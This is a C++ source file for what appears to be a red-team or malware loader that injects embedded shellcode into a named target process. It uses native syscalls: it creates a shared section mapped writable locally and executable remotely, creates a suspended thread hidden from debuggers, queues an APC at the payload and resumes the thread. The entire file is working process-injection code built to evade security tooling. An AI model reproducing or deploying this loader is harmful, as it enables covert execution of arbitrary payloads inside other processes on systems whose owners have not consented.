#include "whisper.h"
#include "NomadBishop.h"
#include <iostream>
using namespace std;

int wmain(int argc, wchar_t **argv)
{
    /****************************************************************************
        Step 0: Determine target PID and locate payload in the resources header
    *****************************************************************************/

    // NTDLL handle used for locating RTL functions and calculating remote thread offset
    hNTDLL = GetModuleHandle(L"ntdll.dll");

    // Get PID for the specified process
    DWORD dwPid = GetPID(argv[1]);

    if (dwPid == 0) {
        wcout << "[!] Failed to get PID for target process: " << argv[1] << endl;
        return 1;
    }

    wcout << "[+] Located target PID: " << dwPid << endl;


    // Get handle to shellcode blob in resources
    HRSRC hPayload = FindResource(NULL, MAKEINTRESOURCE(RID), L"BINARY");
    if (hPayload == NULL) {
        wcout << "[!] Failed to locate payload in resources" << endl;
        return 1;
    }

    // Get the size of the shellcode blob
    DWORD dwPayloadSize = SizeofResource(NULL, hPayload);

    // Get pointer to the shellcode blob
    LPVOID lpPayload = LockResource(LoadResource(NULL, hPayload));
    
    wcout << "[+] Located payload: " << dwPayloadSize << " bytes at " << lpPayload << endl;

    
    NTSTATUS status; // Return status for syscalls


    /********************************************
        Step 1: Get handle to target process
    *********************************************/

    HANDLE hRemoteProc = nullptr;
    CLIENT_ID cid = { UlongToHandle(dwPid), NULL };
    OBJECT_ATTRIBUTES oa = { NULL, NULL, NULL, NULL };

    status = NtOpenProcess(&hRemoteProc, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, &oa, &cid);
    
    if (status < 0) {
        wcout << "[!] NtOpenProcess failed: " << status << endl;
        return 1;
    }

    wcout << "[+] Acquired handle to remote process" << endl;


    /***************************
        Step 2: Create section
    ****************************/

    HANDLE hSection = nullptr;
    LARGE_INTEGER liMaxSize = { dwPayloadSize };
    
    status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL,
                                &liMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    
    if (status < 0) {
        wcout << "[!] NtCreateSection failed: " << status << endl;
        return 1;
    }

    wcout << "[+] Created section" << endl;


    /***************************************************
        Step 3: Map RW view of section in local process
    ****************************************************/

    HANDLE hLocalProc = GetCurrentProcess();
    LPVOID lpLocalAddress = nullptr;
    SIZE_T ulViewSize = dwPayloadSize;
    
    status = NtMapViewOfSection(hSection, hLocalProc, &lpLocalAddress, NULL, NULL, NULL,
                                &ulViewSize, ViewShare, NULL, PAGE_READWRITE);
    
    if (status < 0) {
        wcout << "[!] NtMapViewOfSection local failed: " << status << endl;
        return 1;
    }
    
    wcout << "[+] Mapped view in local process: " << lpLocalAddress << endl;


    /****************************************************
        Step 4: Map RX view of section in remote process
    *****************************************************/

    LPVOID lpRemoteAddress = nullptr;
    
    status = NtMapViewOfSection(hSection, hRemoteProc, &lpRemoteAddress, NULL, NULL, NULL,
                                &ulViewSize, ViewShare, NULL, PAGE_EXECUTE_READ);
    
    if (status < 0) {
        wcout << "[!] NtMapViewOfSection remote failed: " << status << endl;
        return 1;
    }

    wcout << "[+] Mapped view in target process: " << lpRemoteAddress << endl;

    // Close section handle
    NtClose(hSection);


    /**************************************
        Step 5: Copy payload to section
    ***************************************/

    SIZE_T cbWritten;

    status = NtWriteVirtualMemory(hLocalProc, lpLocalAddress, lpPayload, dwPayloadSize, &cbWritten);
    
    if (status < 0) {
        wcout << "[!] NtWriteVirtualMemory failed: " << status << endl;
        return 1;
    }

    wcout << "[+] Wrote " << cbWritten << " bytes to local section" << endl;

    // Unmap local view and close local process handle since they're no longer needed
    NtUnmapViewOfSection(hLocalProc, lpLocalAddress);
    NtClose(hLocalProc);


    /********************************************
        Step 6: Create thread in remote process
    *********************************************/

    // Get RtlExitUserThread function address
    LPVOID lpFuncAddress = GetProcAddress(hNTDLL, "RtlExitUserThread");

    wcout << "[+] RtlExitUserThread address: " << lpFuncAddress << endl;

    // Calculate thread start offset in remote process
    LPVOID lpTargetStart = hNTDLL + (UINT64)lpFuncAddress;

    wcout << "[+] Remote thread start address: " << lpTargetStart << endl;

    // Intialize thread handle
    HANDLE hThread = nullptr;

    // Create suspended thread in target process
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hRemoteProc, (LPTHREAD_START_ROUTINE)lpTargetStart,
                                NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, NULL,
                                NULL, NULL, nullptr);

    if (status < 0) {
        wcout << "[!] NtCreateThreadEx failed: " << status << endl;
        return 1;
    }

    wcout << "[+] Created suspended thread in target process" << endl;


    /*****************************
        Step 7: Queue APC thread
    ******************************/

    status = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)lpRemoteAddress, NULL, NULL, NULL);

    if (status < 0) {
        wcout << "[!] NtQueueApcThread failed: " << status << endl;
        return 1;
    }

    wcout << "[+] Queued APC thread at address: " << lpRemoteAddress << endl;


    /***************************
        Step 8: Trigger thread
    ****************************/

    DWORD dwSuspendCount = 0;

    status = NtAlertResumeThread(hThread, &dwSuspendCount);

    if (status < 0) {
        wcout << "[!] NtAlertResumeThread failed: " << status << endl;
        return 1;
    }

    wcout << "[+] Thread triggered" << endl;
    
    // Close handles
    NtClose(hThread);
    NtClose(hRemoteProc);

    wcout << "[+] Done" << endl;

    return 0;
}

// Function:    GetPID
// Description: Find the PID for a process specified by name
// Arguments:   Wide char array containing the process name
// Called from: wmain
DWORD GetPID(const wchar_t *sProcessName)
{
    // Resolve RTL function addresses
    fnRtlInitUnicodeString RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(hNTDLL, "RtlInitUnicodeString");
    fnRtlEqualUnicodeString RtlEqualUnicodeString = (fnRtlEqualUnicodeString)GetProcAddress(hNTDLL, "RtlEqualUnicodeString");

    if (!RtlInitUnicodeString || !RtlEqualUnicodeString) {
        wcout << "[!] Failed to resolve RTL unicode string functions?" << endl;
        return 0;
    }

    DWORD dwPid = 0;
    ULONG ulSize = 0;
    HANDLE hHeap = GetProcessHeap();

    // Get amount of memory needed for the process table
    if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ulSize) != 0xC0000004)
        // Expecting specific STATUS_INFO_LENGTH_MISMATCH status, ulSize is populated with the amount of memory needed.
        return 0;

    // Allocate memory to store process information
    LPVOID lpBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulSize);

    // Verify allocation was successful
    if (!lpBuffer)
        return 0;

    // Get process information
    if (NtQuerySystemInformation(SystemProcessInformation, lpBuffer, ulSize, &ulSize) != 0) {
        // Free buffer and return on failure
        if (lpBuffer)
            HeapFree(hHeap, NULL, lpBuffer);
        return 0;
    }

    // Assign struct pointer
    PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)lpBuffer;

    // Create unicode string from wide char array
    UNICODE_STRING usProcessName;
    RtlInitUnicodeString(&usProcessName, (PCWSTR)sProcessName);

    // Loop through processes and compare against the provided name
    while (pProcInfo->NextEntryDelta != 0) {
        if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &usProcessName, TRUE)) {
            // Located the process
            dwPid = HandleToUlong(pProcInfo->ProcessId);
            break;
        }
        // Move pointer to next entry
        pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);
    }

    // Free up previously allocated memory
    if (lpBuffer)
        HeapFree(hHeap, NULL, lpBuffer);

    // Return 0 or the target PID if located
    return dwPid;
}
